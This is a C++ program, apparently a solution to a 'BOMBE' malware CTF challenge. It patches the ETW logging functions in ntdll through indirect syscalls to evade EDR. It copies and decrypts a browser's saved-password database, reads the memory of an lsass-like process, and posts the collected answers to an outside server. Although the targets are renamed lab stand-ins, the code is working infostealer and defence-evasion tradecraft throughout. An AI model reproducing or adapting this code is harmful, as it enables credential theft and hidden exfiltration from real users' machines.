#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include <sstream>
#include "Syscalls.h"
#include "sqlite3.h"

// 保持 Lib 連結以防止 Crash
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")



// [FIX] 修復 KPRIORITY 未定義
typedef LONG KPRIORITY;
// =============================================================
// [結構定義區]
// =============================================================

// 定義必要的 NT 結構與 Enum
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// --- Registry Structures ---
typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataLength;
    UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, * PKEY_VALUE_PARTIAL_INFORMATION;

// --- Process Enumeration Structures (For NtQuerySystemInformation) ---
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemProcessInformation = 5
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

// --- Memory Query Structures (For NtQueryVirtualMemory) ---
typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


// NT Constants
#define FILE_SUPERSEDE                  0x00000000
#define FILE_OPEN                       0x00000001
#define FILE_CREATE                     0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_OVERWRITE                  0x00000004
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_MAXIMUM_DISPOSITION        0x00000005

#define FILE_READ_DATA        0x0001
#define FILE_WRITE_DATA       0x0002
#define FILE_SHARE_READ       0x0001
#define FILE_SHARE_WRITE      0x0002
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#define OBJ_CASE_INSENSITIVE  0x00000040L

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

// ==========================================
// [Syscalls 宣告]
// ==========================================
// Syscall Prototypes
extern "C" {
    NTSTATUS Sw3NtCreateFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    NTSTATUS Sw3NtReadFile(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    NTSTATUS Sw3NtWriteFile(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    NTSTATUS Sw3NtClose(HANDLE);

    NTSTATUS Sw3NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    NTSTATUS Sw3NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS Sw3NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS Sw3NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS Sw3NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    // New for Challenge 1 & 3
    NTSTATUS Sw3NtOpenKey(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    NTSTATUS Sw3NtQueryValueKey(HANDLE, PUNICODE_STRING, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    NTSTATUS Sw3NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    NTSTATUS Sw3NtQueryVirtualMemory(HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T);

    // SysWhispers Resolvers (Assume these exist in your generated files)
    void* SW3_GetRandomSyscallAddress();
    DWORD SW3_GetSyscallNumber(DWORD Hash);
}

const char* SECRET = "0xBGaqjzZL7khGY5AcFs3oi0lIMmkvMF";

std::string GetSecret() {
    return std::string(SECRET);
}

void AnsiToUnicode(const char* ansi, UNICODE_STRING* us) {
    int len = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
    wchar_t* wstr = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, ansi, -1, wstr, len);
    us->Length = (USHORT)((len - 1) * sizeof(wchar_t));
    us->MaximumLength = (USHORT)(len * sizeof(wchar_t));
    us->Buffer = wstr;
}

std::vector<BYTE> HexStringToByteArray(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        bytes.push_back((BYTE)strtoul(byteString.c_str(), NULL, 16));
    }
    return bytes;
}

std::string EscapeJsonString(const std::string& str) {
    std::ostringstream escaped;
    for (char c : str) {
        if (c == '"' || c == '\\') escaped << "\\\\"; else escaped << c;
    }
    return escaped.str();
}

// ==========================================
// [Anti-ETW] Stealth Patch
// ==========================================
/*
void PatchETW() {
    // 移除 XorString，直接使用明文
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    void* pTarget = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pTarget) return;

    // Pattern: MOV EAX, 0; RET (取代常見的 XOR RAX, RAX)
    unsigned char patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

    PVOID baseAddr = pTarget;
    SIZE_T regionSize = sizeof(patch);
    ULONG oldProtect = 0;

    // 透過 Indirect Syscall 寫入
    if (NT_SUCCESS(Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_READWRITE, &oldProtect))) {
        SIZE_T bytesWritten = 0;
        Sw3NtWriteVirtualMemory(GetCurrentProcess(), pTarget, patch, sizeof(patch), &bytesWritten);
        ULONG tempProtect = 0;
        Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READ, &tempProtect);
        // std::cout << "[+] ETW Patched" << std::endl;
    }
}
*/


// ==========================================
// [Anti-ETW] Patching EtwEventWrite & EtwEventRegister
// ==========================================
void BypassETW_Syscalls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    // 我們要 Patch 的目標函數列表
    // EtwEventWrite: 寫入事件
    // EtwEventRegister: 註冊 Provider (Patch 這個可以防止新的監控啟動)
    const char* targets[] = { "EtwEventWrite", "EtwEventRegister" };

    // Pattern: MOV EAX, 0; RET (B8 00 00 00 00 C3)
    // 這比 XOR EAX, EAX (33 C0) 更隱蔽，且有效。
    // 對於這兩個函數，回傳 0 (STATUS_SUCCESS / ERROR_SUCCESS) 代表成功，
    // 所以 EDR 會以為它成功寫入了 Log 或成功註冊了 Provider，但實際上什麼都沒做。
    unsigned char patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

    for (const char* funcName : targets) {
        void* pTarget = GetProcAddress(hNtdll, funcName);
        if (pTarget) {
            PVOID baseAddr = pTarget;
            SIZE_T regionSize = sizeof(patch);
            ULONG oldProtect = 0;
            NTSTATUS status;

            // 1. [Indirect Syscall] 修改權限為 RWX
            status = Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            if (NT_SUCCESS(status)) {
                SIZE_T bytesWritten = 0;

                // 2. [Indirect Syscall] 寫入 Patch
                status = Sw3NtWriteVirtualMemory(GetCurrentProcess(), pTarget, patch, sizeof(patch), &bytesWritten);

                if (NT_SUCCESS(status)) {
                    // std::cout << "[+] " << funcName << " Patched via Indirect Syscalls." << std::endl;
                }

                ULONG tempProtect = 0;
                // 3. [Indirect Syscall] 還原權限
                Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, oldProtect, &tempProtect);
            }
        }
    }
}

// ==========================================
// [File I/O via Syscalls]
// ==========================================
std::vector<BYTE> ReadFileSyscall(const char* filePath) {
    std::vector<BYTE> buffer;

    // 直接使用明文路徑前綴
    std::string ntPath = "\\??\\";
    ntPath += filePath;

    UNICODE_STRING usPath;
    AnsiToUnicode(ntPath.c_str(), &usPath);

    OBJECT_ATTRIBUTES oa;
    memset(&oa, 0, sizeof(OBJECT_ATTRIBUTES));
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.RootDirectory = NULL;
    oa.ObjectName = &usPath;
    oa.Attributes = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus = { 0 };

    NTSTATUS status = Sw3NtCreateFile(&hFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &oa,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);

    delete[] usPath.Buffer;

    if (NT_SUCCESS(status)) {
        const size_t MAX_READ = 50 * 1024 * 1024;
        buffer.resize(MAX_READ);
        LARGE_INTEGER offset = { 0 };
        status = Sw3NtReadFile(hFile, NULL, NULL, NULL, &ioStatus, buffer.data(), MAX_READ, &offset, NULL);
        if (NT_SUCCESS(status)) {
            buffer.resize(ioStatus.Information);
        }
        else {
            buffer.clear();
        }
        Sw3NtClose(hFile);
    }
    return buffer;
}

bool WriteFileSyscall(const char* filePath, const std::vector<BYTE>& data) {
    std::string ntPath = "\\??\\";
    ntPath += filePath;

    UNICODE_STRING usPath;
    AnsiToUnicode(ntPath.c_str(), &usPath);

    OBJECT_ATTRIBUTES oa;
    memset(&oa, 0, sizeof(OBJECT_ATTRIBUTES));
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.RootDirectory = NULL;
    oa.ObjectName = &usPath;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus = { 0 };
    bool success = false;

    if (NT_SUCCESS(Sw3NtCreateFile(&hFile,
        FILE_WRITE_DATA | SYNCHRONIZE,
        &oa,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0))) {

        LARGE_INTEGER offset = { 0 };
        if (NT_SUCCESS(Sw3NtWriteFile(hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (ULONG)data.size(), &offset, NULL))) {
            success = true;
        }
        Sw3NtClose(hFile);
    }
    delete[] usPath.Buffer;
    return success;
}


std::string DecryptPassword(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY hKey = NULL;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "";
    struct { BLOBHEADER hdr; DWORD dwKeySize; BYTE rgbKey[32]; } keyBlob;
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB; keyBlob.hdr.bVersion = CUR_BLOB_VERSION; keyBlob.hdr.reserved = 0; keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.dwKeySize = key.size(); memcpy(keyBlob.rgbKey, key.data(), key.size());
    HCRYPTKEY hTempKey = NULL;
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hTempKey)) { CryptReleaseContext(hProv, 0); return ""; }
    hKey = hTempKey;
    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0);
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    DWORD dataLen = encryptedData.size();
    std::vector<BYTE> decryptedData = encryptedData;
    std::string result = "";
    if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedData.data(), &dataLen)) {
        result = std::string(reinterpret_cast<const char*>(decryptedData.data()), dataLen);
    }
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return result;
}

// ==========================================
// Challenge 1: Registry (Indirect Syscall)
// ==========================================
std::string Challenge1() {
    // 移除 XOR，直接使用明文 NT 路徑
    std::string sNtPath = "\\Registry\\Machine\\SOFTWARE\\BOMBE";

    UNICODE_STRING usKeyName;
    AnsiToUnicode(sNtPath.c_str(), &usKeyName);
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), NULL, &usKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL };

    HANDLE hKey = NULL;
    NTSTATUS status = Sw3NtOpenKey(&hKey, KEY_QUERY_VALUE, &oa);
    delete[] usKeyName.Buffer;

    if (!NT_SUCCESS(status)) return "";

    std::string s_val = "answer_1";
    UNICODE_STRING usValueName;
    AnsiToUnicode(s_val.c_str(), &usValueName);

    char buffer[1024];
    ULONG resultLength = 0;
    status = Sw3NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation, buffer, sizeof(buffer), &resultLength);
    delete[] usValueName.Buffer;
    Sw3NtClose(hKey);

    if (NT_SUCCESS(status)) {
        PKEY_VALUE_PARTIAL_INFORMATION pInfo = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
        if (pInfo->Type == 1 && pInfo->DataLength > 0) {
            std::wstring wResult((wchar_t*)pInfo->Data, pInfo->DataLength / sizeof(wchar_t));
            if (!wResult.empty() && wResult.back() == L'\0') wResult.pop_back();
            int size_needed = WideCharToMultiByte(CP_ACP, 0, wResult.c_str(), (int)wResult.length(), NULL, 0, NULL, NULL);
            std::string strTo(size_needed, 0);
            WideCharToMultiByte(CP_ACP, 0, wResult.c_str(), (int)wResult.length(), &strTo[0], size_needed, NULL, NULL);
            return strTo;
        }
    }
    return "";
}


// ==========================================
// Challenge 2: Chrome DB (Indirect Syscalls)
// ==========================================
std::string Challenge2() {
    // 移除 XOR，直接使用明文路徑
    std::string dbPath = "C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data";

    std::vector<BYTE> fileData = ReadFileSyscall(dbPath.c_str());
    if (fileData.empty()) return "FAILED_READ_DB";

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char tempFile[MAX_PATH];
    GetTempFileNameA(tempPath, "tmp", 0, tempFile);

    if (!WriteFileSyscall(tempFile, fileData)) return "ERR_WRITE";

    sqlite3* db;
    std::string finalFlag = "FLAG_NOT_FOUND";
    if (sqlite3_open(tempFile, &db) == SQLITE_OK) {
        // 使用明文查詢語句
        const char* q = "SELECT password_value FROM logins";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, q, -1, &stmt, NULL) == SQLITE_OK) {
            std::string secStr = GetSecret();
            std::vector<BYTE> keyBytes(32);
            memcpy(keyBytes.data(), secStr.c_str(), 32);

            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* pwHex = (const char*)sqlite3_column_text(stmt, 0);
                if (pwHex) {
                    std::vector<BYTE> encBytes = HexStringToByteArray(pwHex);
                    if (encBytes.size() >= 32) {
                        std::vector<BYTE> iv(encBytes.begin(), encBytes.begin() + 16);
                        std::vector<BYTE> data(encBytes.begin() + 16, encBytes.end());
                        std::string dec = DecryptPassword(data, keyBytes, iv);
                        
                        std::cout << dec << std::endl;
                        if (dec.find("BOMBE_MAL_FLAG_") == 0) {
                            finalFlag = dec;
                            std::cout << "hit"<<std::endl;
                            break;
                        }
                    }   
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    DeleteFileA(tempFile);
    return finalFlag;
}

// ==========================================
// Challenge 3: Memory Scan (Indirect Syscalls)
// ==========================================
std::string Challenge3() {
    ULONG bufferSize = 0;
    Sw3NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);

    bufferSize += 1024;
    PVOID buffer = NULL;
    SIZE_T size = bufferSize;

    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &buffer, (ULONG_PTR)0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!buffer) return "";

    NTSTATUS status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) return "";

    DWORD pid = 0;
    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    // 使用明文目標進程名
    const char* target = "bsass.exe";

    while (TRUE) {
        if (spi->ImageName.Buffer) {
            int len = WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2, NULL, 0, NULL, NULL);
            std::string name(len, 0);
            WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2, &name[0], len, NULL, NULL);

            if (_stricmp(name.c_str(), target) == 0) {
                pid = (DWORD)(uintptr_t)spi->UniqueProcessId;
                break;
            }
        }
        if (spi->NextEntryOffset == 0) break;
        spi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)spi + spi->NextEntryOffset);
    }

    if (pid == 0) return "";

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), NULL, NULL, 0, NULL, NULL };
    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(uintptr_t)pid;
    cid.UniqueThread = 0;

    if (!NT_SUCCESS(Sw3NtOpenProcess(&hProcess, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &oa, &cid))) return "";

    MEMORY_BASIC_INFORMATION mbi;
    PVOID addr = 0;
    std::string result = "";
    std::regex re("BOMBE_MAL_FLAG_[A-Za-z0-9]{32}");

    while (TRUE) {
        SIZE_T retLen = 0;
        status = Sw3NtQueryVirtualMemory(hProcess, addr, MemoryBasicInformation, &mbi, sizeof(mbi), &retLen);
        if (!NT_SUCCESS(status)) break;

        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (NT_SUCCESS(Sw3NtReadVirtualMemory(hProcess, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead)) && bytesRead > 0) {
                std::string content((char*)buf.data(), bytesRead);
                std::smatch match;
                if (std::regex_search(content, match, re)) {
                    result = match.str();
                    break;
                }
            }
        }
        addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }
    Sw3NtClose(hProcess);
    return result;
}

// Submission
void SendAnswerToServer(const std::string& jsonPayload) {
    HINTERNET hSession = WinHttpOpen(L"Malware/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, L"submit.bombe.top", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/submitMalAns", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring headers = L"Content-Type: application/json\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    std::string payload = jsonPayload;
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)payload.c_str(), payload.length(), payload.length(), 0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
        DWORD dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            std::vector<BYTE> buffer(dwSize + 1);
            DWORD dwDownloaded = 0;
            WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {
    try {
        //PatchETW();
        BypassETW_Syscalls();

        std::string a1 = Challenge1();
        std::string a2 = Challenge2();
        std::string a3 = Challenge3();

        std::ostringstream json;
        json << "{";
        json << "\"answer_1\":\"" << EscapeJsonString(a1) << "\",";
        json << "\"answer_2\":\"" << EscapeJsonString(a2) << "\",";
        json << "\"answer_3\":\"" << EscapeJsonString(a3) << "\",";
        json << "\"secret\":\"" << GetSecret() << "\"";
        json << "}";

        std::cout << json.str() << std::endl;

        SendAnswerToServer(json.str());
    }
    catch (...) {
    }
    return 0;
}
